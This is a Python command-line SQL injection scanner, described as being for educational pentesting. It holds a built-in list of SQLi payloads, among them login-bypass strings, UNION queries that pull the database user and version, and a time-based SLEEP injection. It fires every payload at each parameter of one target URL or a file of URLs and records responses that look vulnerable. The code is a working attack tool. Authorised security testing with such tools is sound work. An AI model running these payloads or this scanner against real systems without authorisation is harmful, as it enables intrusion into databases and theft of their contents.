#!/usr/bin/env python3
import argparse
import json
import time
import requests
import csv
from typing import Dict, Any, List


# --- Payloads ---
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "' OR '1'='1' --",
    "' AND 1=CAST((SELECT user()) AS INT)--",
    "' AND (SELECT COUNT(*) FROM users) > 0--",
    "' UNION SELECT null, user() --",
    "' UNION SELECT null, database(), version() --",
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND SUBSTRING(@@version,1,1)='5' --",
    "' OR IF(1=1, SLEEP(5), 0)--",
]

# --- Request timer ---
def timed_request(session: requests.Session, method: str, url: str, **kwargs) -> requests.Response:
    start = time.time()
    resp = session.request(method, url, timeout=kwargs.pop("timeout", 15), **kwargs)
    resp.elapsed_total = time.time() - start  # type: ignore[attr-defined]
    return resp


# --- Scanner ---
def scan_parameter(
    session: requests.Session,
    url: str,
    method: str,
    base_params: Dict[str, Any],
    headers: Dict[str, str],
    cookies: Dict[str, str],
    vector: str,
    timeout: int,
    time_threshold: float,
    is_json: bool
) -> List[Dict[str, Any]]:
    findings = []

    for key in base_params.keys():
        for payload in PAYLOADS:
            test_params = base_params.copy()
            test_params[key] = payload

            if method.upper() == "GET":
                resp = timed_request(session, method, url,
                                     params=test_params,
                                     headers=headers,
                                     cookies=cookies,
                                     timeout=timeout,
                                     allow_redirects=True)
            elif method.upper() == "POST":
                if vector == "body" and is_json:
                    resp = timed_request(session, method, url,
                                         json=test_params,
                                         headers=headers,
                                         cookies=cookies,
                                         timeout=timeout,
                                         allow_redirects=True)
                elif vector == "body":
                    resp = timed_request(session, method, url,
                                         data=test_params,
                                         headers=headers,
                                         cookies=cookies,
                                         timeout=timeout,
                                         allow_redirects=True)
                else:
                    resp = timed_request(session, method, url,
                                         params=test_params,
                                         headers=headers,
                                         cookies=cookies,
                                         timeout=timeout,
                                         allow_redirects=True)
            else:
                continue

            # detection heuristics
            vulnerable = False
            reason = ""

            if any(err in resp.text.lower() for err in ["sql syntax", "mysql", "syntax error", "unterminated"]):
                vulnerable = True
                reason = "Error-based"
            elif resp.elapsed_total > time_threshold:
                vulnerable = True
                reason = f"Time-based (> {time_threshold}s)"
            elif payload in resp.text:
                vulnerable = True
                reason = "Reflection-based"

            if vulnerable:
                findings.append({
                    "param": key,
                    "payload": payload,
                    "vector": vector,
                    "reason": reason,
                    "status": resp.status_code,
                    "time": round(resp.elapsed_total, 2),
                })
    return findings


def main():
    parser = argparse.ArgumentParser(description="Simple SQLi Scanner for educational pentesting.")
    g = parser.add_mutually_exclusive_group(required=True)
    g.add_argument("--url", help="Target URL")
    g.add_argument("--urls", help="File with list of URLs")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")
    parser.add_argument("--data", help="POST body in key=value&key2=value2 format")
    parser.add_argument("--json", help="POST body as JSON string (e.g. '{\"username\":\"a\",\"password\":\"b\"}')")
    parser.add_argument("--headers", help="Custom headers in JSON format")
    parser.add_argument("--cookies", help="Custom cookies in JSON format")
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--time-threshold", type=float, default=4.0)
    parser.add_argument("--out", help="Output CSV file name")
    parser.add_argument("--debug", action="store_true", help="Verbose output")
    args = parser.parse_args()

    urls = []
    if args.url:
        urls = [args.url]
    elif args.urls:
        with open(args.urls) as f:
            urls = [line.strip() for line in f if line.strip()]

    headers = json.loads(args.headers) if args.headers else {}
    cookies = json.loads(args.cookies) if args.cookies else {}

    all_findings = []

    for url in urls:
        base_params: Dict[str, Any] = {}
        if args.method == "POST":
            if args.data:
                base_params = dict(
                    [tuple(p.split("=", 1)) if "=" in p else (p, "") for p in args.data.split("&")]
                )
            elif args.json:
                try:
                    base_params = json.loads(args.json)
                except json.JSONDecodeError:
                    print(f"[!] Invalid JSON in --json: {args.json}")
                    continue

        session = requests.Session()

        vectors = ["query"]
        if args.method == "POST":
            vectors.append("body")

        for vector in vectors:
            findings = scan_parameter(
                session, url, args.method, base_params,
                headers, cookies, vector, args.timeout,
                args.time_threshold, bool(args.json)
            )
            for f in findings:
                f["url"] = url
            all_findings.extend(findings)

    if args.out:
        with open(args.out + ".csv", "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=["url", "param", "payload", "vector", "reason", "status", "time"])
            writer.writeheader()
            writer.writerows(all_findings)
        print(f"[+] Results saved to {args.out}.csv")
    else:
        for f in all_findings:
            print(f)


if __name__ == "__main__":
    main()
